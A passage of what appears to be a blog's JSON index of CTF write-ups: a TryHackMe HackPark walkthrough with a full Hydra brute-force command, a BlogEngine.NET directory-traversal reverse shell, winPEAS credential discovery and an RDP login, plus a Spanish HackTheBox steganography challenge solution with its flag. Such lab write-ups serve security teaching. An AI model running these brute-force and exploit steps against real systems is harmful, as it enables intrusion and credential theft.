Body__VIEWSTATE=49GAAjlZ%2B4B1%2Bz38DrOFSr7m8aWbh0CXLp8Xr2aPBM2liP4BPRanZv%2Bsnfh62wyJQLsPPiHvYs6oZ5ngezwSDWtN9kSbkJYkqhj%2Fdcvfk0iQv7ShrL9zDiVLHkHAzvF7bEV0%2FgUB5BfJVrw0MFhYcvzn9a0rlmhy8J%2BMjjD53W4mULD4&amp;amp;__EVENTVALIDATION=sXh8q7nd3FnQbnON%2BvVUJwD7BbO7R8oPcmNeBZMWODV4Exie1bp00VsrrcY70IHcnw%2B3oo%2Bgu%2FXsUt2HuFYShgSXZf1qf%2FOosRaywgIUr7HIriKizOiGdSotndccZxhlmHYKGSu9iGAuAQsT5%2BZoAu3zLyGex42pPknzmCQw5%2FRCe%2BUN&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=usertest&amp;amp;ctl00%24MainContent%24LoginUser%24Password=passtest&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+inFor hydra to work, we need to specify a couple of placeholders for the USER and PASS parameters in the request. If we take a closer look to the raw request, we can see the user and pass entered earlier:LoginUser%24UserName=usertest&amp;amp;ctl00%24MainContent%24LoginUser%24Password=passtestSo in this case, we replace usertest for ^USER^ and passtest for ^PASS^.LoginUser%24UserName=^USER^&amp;amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^Full commandAfter getting all the information, the full command looks like this:hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.203.246 http-post-form &quot;/Account/login.aspx:__VIEWSTATE=DuOBP%2BgZJeq6AMydj5niN1uZM%2FDPpZMaxfWo5oEC4brEJy1oBLy29HUrOfHMJVOGXkG1660e6jVooc9Yq08XSwXuS6%2BEAz0wmCd9zrPJ%2FvRTEfvW4%2FydsHFgcUy%2BaIkSagapG4M4u0EK%2FxLTi5gChTWoajmuqFTxAa8qQQJOi7n9k0Fmpfq1MZzahKDFn5OJvCfq6JW%2FQVV4w%2FwQsnL03wpViAbcqU5CAVBTo9igmfmnTanl64dDgoz8ZkXx0sfLD8O136c%2BVm6kcfY3olmQUP34NqflsNH9hVBYr4piqoMqK%2BQjG2SI4cgyyRbcUjLnOryib9veu%2BsGI147wYnLVmnQT1HR0uePIIBJ%2BA3UQJZngtnK&amp;amp;__EVENTVALIDATION=yxXvvmOhIbyz01WxElUbLdtpbMGxCzl5Rt2yC8ppVo8aEkoGj61ik751%2FMdx5Ea6wPF4FA5bjdCtJ%2BJ2terqrBoDEHH8mETsjtorsuBx5xG0AxeHmiNLCZGHt0BDXhVuDeihrfZuN6Wb89YIQvzsLZT4aFAD2DEeuiF3stBpJy%2Bco6jP&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&quot; -t 60 -VSo we launch hydra and in a couple of minutes we get the password for the user admin.Logging in, the first thing to do is find the CMS version, for this we navigate to the About tab on the sidebar menu.With this information, now we proceed to take a look on exploitdb if there is already an exploit or CVE for this CMS.There is indeed an exploit available for our CMS version. Lets take a look to the one named BlogEngine.NET 3.3.6/3.3.7 - ‘dirPath’ Directory Traversal / Remote Code Execution and read it carefully.It is a exploit written in C# which will allow us to get a reverse shell exploiting a vulnerable code in the PostList.ascx.cs file. To abuse this vulnerability, we have to do the following: Edit the exploit with our local IP address and Port for the reverse shell. Set a listener with the same parameters.┌─[✗]─[root@parrot]─[/home/hsct/TryHackMe/HackPark]└──╼ #rlwrap nc -nlvp 443listening on [any] 443 ... Rename the exploit as: PostView.ascx. In the CMS, navigate to Content &amp;gt; Posts &amp;gt; New and add a new post uploading our PostView.ascx file. Click on the open folder icon. Upload the exploit using the file manager and add it to the new post. Set a title and save it. Open the URL: http://10.10.203.246/?theme=../../App_Data/files.Finally we get the reverse shell.┌─[✗]─[root@parrot]─[/home/hsct/TryHackMe/HackPark]└──╼ #rlwrap nc -nlvp 443listening on [any] 443 ...connect to [10.13.0.103] from (UNKNOWN) [10.10.203.246] 49428Microsoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.Privilege EscalationFor privesc we are going to use winPEAS which is awesome for a quick system scan. We need to make sure to download the correct version of the binary as we are in a x64 machine.Host Name: HACKPARKOS Name: Microsoft Windows Server 2012 R2 Standard EvaluationOS Version: 6.3.9600 N/A Build 9600OS Manufacturer: Microsoft CorporationOS Configuration: Standalone ServerOS Build Type: Multiprocessor FreeRegistered Owner: Windows UserRegistered Organization:Product ID: 00252-10000-00000-AA228Original Install Date: 8/3/2019, 10:43:23 AMSystem Boot Time: 7/31/2020, 9:45:02 PMSystem Manufacturer: XenSystem Model: HVM domUSystem Type: x64-based PCWith the tool already in the machine, we proceed to run it by simply doing winPEAS.exe from the console. Then we will take a moment to analyze the output.Scrolling through, we reach the following section that looks interesting:winPEAS just found us some autologon credentials from the Administrator user, so the next step will be checking this using RDP.xfreerdp /u:Administrator /p:4q6Xv******** /v:10.10.203.246That’s it! Now we have Administrator privileges and access to the root flag in the desktop." }, { "title": "Blackhole Challenge Writeup [ES] - HackTheBox", "url": "/Blackhole-Challenge-Writeup-HackTheBox/", "categories": "HTB", "tags": "ctf, misc", "date": "2020-07-26 12:20:55 -0400", "snippet": "En esta ocasión estaremos realizando el Challenge Blackhole de la plataforma HackTheBox que pertenece a la categoria MISC. A continuación el detalle desde la plataforma:Para empezar obtenemos un archivo llamado Blackhole.zip, el cual al descomprimirlo nos generará el archivo hawking.Lo primero será visualizar la imagen para verificar si existe algún tipo de información útil en su interior.Como se puede apreciar, es una imagen con la fotografía Stephen Hawking y la frase “Life would be tragic if it weren’t funny.”. En primera instancia pensé que se podía tratar de una pista para conseguir la flag, por lo que busqué en internet para después de un tiempo darme cuenta de que la resolución no iba por ese camino.Ya que verificamos que la imagen no contiene mayor información relevante, toca revisar el fichero. Lo primero es ejecutar el comando file para ver con que tipo de archivo estamos tratando.Vemos que se trata de un archivo JPEG pero éste no viene con la extensión, por lo que renombramos el archivo para poder aplicar la utilidad Stegcracker sobre él. Esto para observar si contiene algún archivo oculto en su interior. Haciendo uso del diccionario rockyou.txt le aplicamos fuerza bruta.stegcracker hawking.jpg /usr/share/wordlists/rockyou.txtAl cabo de unos minutos obtenemos un match con la contraseña hawkingez y como resultado nos genera el archivo hawking.jpg.out. Le aplicamos un cat y vemos una cadena de caracteres que parecen estar codificados en base64.Luego de realizar dos decodificaciones seguidas en base64, obtendremos el mensaje que se visualiza a continuación, el cual tiene un formato similar al de la flag que buscamos:Efqbtqz Iuxxumy Tmiwuzs ime mz Qzsxuet ftqadqfuomx btkeuouef, oaeyaxasuef, mzp mgftad, ita ime pudqofad ar dqeqmdot mf ftq Oqzfdq rad Ftqadqfuomx Oaeyaxask mf ftq Gzuhqdeufk ar Omyndupsq mf ftq fuyq ar tue pqmft. Tq ime ftq Xgomeumz Bdarqeead ar Ymftqymfuoe mf ftq Gzuhqdeufk ar Omyndupsq nqfiqqz 1979 mzp 2009. Tmiwuzs motuqhqp oayyqdoumx egooqee iuft eqhqdmx iadwe ar babgxmd eouqzoq uz ituot tq pueogeeqe tue aiz ftqaduqe mzp oaeyaxask uz sqzqdmx. Tue naaw M Nduqr Tuefadk ar Fuyq mbbqmdqp az ftq Ndufuet Egzpmk Fuyqe nqef-eqxxqd xuef rad m dqoadp-ndqmwuzs 237 iqqwe. Tmiwuzs ime m rqxxai ar ftq Dakmx Eaouqfk, m xurqfuyq yqynqd ar ftq Bazfuruomx Mompqyk ar Eouqzoqe, mzp m dqoubuqzf ar ftq Bdqeupqzfumx Yqpmx ar Rdqqpay, ftq tustqef ouhuxumz mimdp uz ftq Gzufqp Efmfqe. Uz 2002, Tmiwuzs ime dmzwqp zgynqd 25 uz ftq NNO\\’e baxx ar ftq 100 Sdqmfqef Ndufaze.TFN{Z3hqD_x3F_fT3_n4eFmDp5_S3f_K0g_p0iZ}A simple vista el mensaje parece estar codificado en ROT13, por lo que con la ayuda de CyberChef, luego de unos intentos, obtendremos nuestro mensaje decodificado junto con la flag." } ]
